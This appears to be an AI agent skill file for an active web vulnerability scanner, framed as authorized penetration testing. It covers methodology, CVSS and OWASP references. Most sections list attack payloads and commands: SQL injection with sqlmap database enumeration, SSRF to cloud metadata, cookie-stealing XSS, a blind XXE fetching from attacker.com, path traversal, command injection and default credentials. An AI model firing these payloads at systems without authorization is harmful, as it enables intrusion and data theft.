---
name: vuln-scanner
description: |
  Active vulnerability detection and proof-of-concept (PoC) validation engine. Detects and
  confirms critical vulnerabilities in web applications including Remote Code Execution (RCE),
  SQL Injection, SSRF, XSS, XXE, Path Traversal, Command Injection, Deserialization flaws,
  Authentication Bypass, and known CVEs via Nuclei template scanning. Generates confirmed,
  evidence-backed findings with CVSS v3.1 scores, OWASP category, CWE ID, and remediation
  guidance. Integrates with the threat-intel skill to validate against CISA KEV and live CVE feeds.
metadata:
  {
    "openclaw":
      {
        "emoji": "🔍",
        "requires": { "bins": ["python3", "nuclei", "curl"] },
        "install":
          [
            {
              "id": "pip-vuln-deps",
              "kind": "shell",
              "cmd": "pip3 install requests httpx rich pyyaml",
              "bins": [],
              "label": "Install vuln-scanner dependencies (pip)"
            },
            {
              "id": "brew-nuclei",
              "kind": "brew",
              "formula": "nuclei",
              "bins": ["nuclei"],
              "label": "Install Nuclei template scanner (brew)"
            }
          ],
      },
  }
---

# Vulnerability Detection & Validation Engine

Active scanning to detect, confirm, and produce evidence for critical security vulnerabilities.

> ⚠️ **Authorization Required**: Only run against systems you have written permission to test.

---

## Vulnerability Categories

### 1. Remote Code Execution (RCE) — CVSS 9.0–10.0
Detect command injection and deserialization flaws that lead to full server compromise.

**Usage:**
> Detect RCE vulnerabilities in https://target.com — test all endpoints

**Detection Approach:**
- Command injection via `; id`, `$(id)`, `` `id` `` in form fields / parameters
- Java deserialization (`ysoserial` payloads against Java endpoints)
- Server-Side Template Injection (SSTI) via `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- PHP eval/include via LFI chains
- Out-of-band DNS callback via Burp Collaborator-style probes

**OWASP Reference:** A03:2021 Injection, CWE-78, CWE-94
**CVSS:** 9.8 (Network / No Auth / High Impact)

---

### 2. SQL Injection — CVSS 7.5–9.8
Detect both error-based and blind (boolean/time-based) SQL injection points.

**Usage:**
> Scan https://target.com for SQL injection vulnerabilities and extract database version

**Detection Approach:**
- Error-based: `'`, `''`, `1'`, `"`, `1"`, `\`
- Boolean blind: `1 AND 1=1--`, `1 AND 1=2--`
- Time-based blind: `1; WAITFOR DELAY '0:0:5'--`, `1' AND SLEEP(5)--`
- Union-based: `1 UNION SELECT NULL,NULL,NULL--`

**Validation (PoC):**
```bash
sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3 --risk=2
sqlmap -u "https://target.com/" --forms --dbs --batch
```

**OWASP Reference:** A03:2021 Injection, CWE-89
**CVSS:** 9.8 (Network / No Auth / Full Impact)

---

### 3. Server-Side Request Forgery (SSRF) — CVSS 7.2–9.8
Detect SSRF vulnerabilities that allow access to internal services and cloud metadata.

**Usage:**
> Test all URL parameters at https://target.com for SSRF

**Detection Approach:**
- Inject internal IP probes: `http://127.0.0.1`, `http://169.254.169.254` (AWS IMDS)
- DNS callback: inject a unique domain and check DNS resolution
- Protocol confusion: `file:///etc/passwd`, `gopher://`, `dict://`

**Validation Payloads:**
```
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://localhost:22/
file:///etc/passwd
```

**OWASP Reference:** A10:2021 SSRF, CWE-918
**CVSS:** 8.6 (Network / No Auth / High Confidentiality)

---

### 4. Cross-Site Scripting (XSS) — CVSS 4.3–8.0
Detect reflected, stored, and DOM-based XSS across all input vectors.

**Usage:**
> Scan https://target.com for stored and reflected XSS vulnerabilities

**Detection Approach:**
- Reflected: inject unique markers, check for unescaped reflection
- Stored: submit payload and retrieve on another page
- DOM-based: analyze JS source for dangerous sinks (`innerHTML`, `eval`, `document.write`)

**Validation Payloads:**
```javascript
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.cookie)
';alert(String.fromCharCode(88,83,83))//
```

**OWASP Reference:** A03:2021 Injection, CWE-79
**CVSS:** 6.1 (Network / No Auth / Medium Impact)

---

### 5. XML External Entity (XXE) — CVSS 7.5–9.8
Detect XXE injection in XML-accepting endpoints.

**Usage:**
> Test XML endpoints at https://target.com for XXE injection

**Detection Payloads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>
```

**Blind XXE (OOB):**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<test/>
```

**OWASP Reference:** A03:2021 Injection, CWE-611
**CVSS:** 9.1 (Network / No Auth / High Impact)

---

### 6. Path Traversal / LFI — CVSS 7.5
Read arbitrary files from the server filesystem.

**Usage:**
> Test file download and include parameters at https://target.com for path traversal

**Detection Payloads:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
/var/www/html/../../../etc/passwd
```

**Validation:** Check for `/etc/passwd` content (`root:x:0:0`) or `C:\Windows\win.ini` strings.

**OWASP Reference:** A01:2021 Broken Access Control, CWE-22

---

### 7. Authentication Bypass — CVSS 7.5–9.8
Detect broken authentication logic across login and session management.

**Usage:**
> Test authentication at https://target.com for bypass vulnerabilities

**Tests:**
- Default credentials: `admin:admin`, `admin:password`, `root:root`
- SQL injection in login: `admin'--` / `' OR 1=1--`
- JWT: `alg: none` attack, weak secret brute-force
- Password reset poisoning via Host header manipulation
- Response manipulation (200 → change `"success": false` to `true`)

**OWASP Reference:** A07:2021 Identification and Authentication Failures, CWE-287

---

### 8. Command Injection — CVSS 9.0–10.0
Detect OS command injection in server-side parameters.

**Usage:**
> Test all input fields at https://target.com for OS command injection

**Detection Payloads:**
```
; id
| id
&& id
$(id)
`id`
; sleep 5
| ping -c 5 127.0.0.1
```

**Time-based blind detection:** Measure response time delay for `sleep 5` payloads.

**OWASP Reference:** A03:2021 Injection, CWE-78

---

### 9. Insecure Deserialization — CVSS 8.1–9.8
Detect unsafe deserialization in Java, PHP, Python, and .NET applications.

**Usage:**
> Test Java application at https://target.com for deserialization vulnerabilities

**Detection Approach:**
- Java: Look for serialized objects (`aced0005`) in cookies, request body, headers
- PHP: `O:8:"stdClass":0:{}` in session cookies
- Python: pickle-based endpoints
- .NET: `BinaryFormatter` usage (detect `AAEAAAD` in base64 params)

**Tools:** `ysoserial`, `ysoserial.net`, `PHPGGC`

**OWASP Reference:** A08:2021 Software and Data Integrity Failures, CWE-502

---

### 10. Known CVE Detection (Nuclei Templates)
Scan for exploitable known CVEs using the latest community Nuclei templates.

**Usage:**
> Scan https://target.com for known CVEs with CVSS score >= 9.0

**Scans:**
```bash
# Critical CVEs only
nuclei -u https://target.com -severity critical -stats -o nuclei_crits.txt

# Specific technology (e.g., Apache, Log4j)
nuclei -u https://target.com -tags log4j,apache,spring -severity critical,high

# Web technologies detected first, then scan
nuclei -u https://target.com -automatic-scan -stats

# Scan entire subdomain list
nuclei -l subs.txt -t cves/ -severity critical,high -o findings.txt
```

**OWASP Reference:** Multiple (depends on CVE), NIST NVD

---

### 11. Security Misconfiguration Detection — CVSS 5.3–9.8
Detect exposed admin panels, debug endpoints, default configs, and sensitive files.

**Usage:**
> Scan https://target.com for security misconfigurations and exposed sensitive paths

**Checks:**
```bash
# Exposed panels and configs
nuclei -u https://target.com -t exposures/ -t misconfiguration/ -severity medium,high,critical

# Sensitive files
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200 -o sensitive_files.txt
```

**Common paths checked:**
```
/.env, /.git/, /backup.zip, /config.json, /wp-config.php
/phpinfo.php, /admin/, /actuator/, /debug, /console
```

**OWASP Reference:** A05:2021 Security Misconfiguration, CWE-16

---

## Validation Methodology

Every finding goes through a 3-step validation process:

```
Step 1 — DETECT    : Passive/active probe returns anomalous response
Step 2 — CONFIRM   : Send PoC payload; observe deterministic evidence
Step 3 — REPORT    : Document with screenshot/response, CVSS score, OWASP ref
```

### Evidence Requirements by Severity

| Severity | Evidence Required |
|---|---|
| **Critical** | Full PoC — extracted data, command output, or OOB callback |
| **High** | Deterministic confirmation — error message, timing, behavior |
| **Medium** | Consistent anomaly — repeated with probe variation |
| **Low** | Policy violation — missing header, verbose error |

---

## Quick Reference

```bash
# Full critical CVE scan
nuclei -u TARGET -severity critical -stats -o crits.txt

# SQLi detection
sqlmap -u "TARGET?id=1" --level=3 --risk=2 --dbs --batch

# XSS fuzzing
ffuf -u "TARGET/search?q=FUZZ" -w xss_payloads.txt -mr "<script>alert"

# SSRF probe
curl -v "TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"

# Path traversal
curl "TARGET/file?path=../../../../etc/passwd"

# XXE test
curl -X POST TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY f SYSTEM "file:///etc/passwd">]><x>&f;</x>'

# Command injection (time-based)
time curl "TARGET/ping?host=127.0.0.1;sleep+5"
```
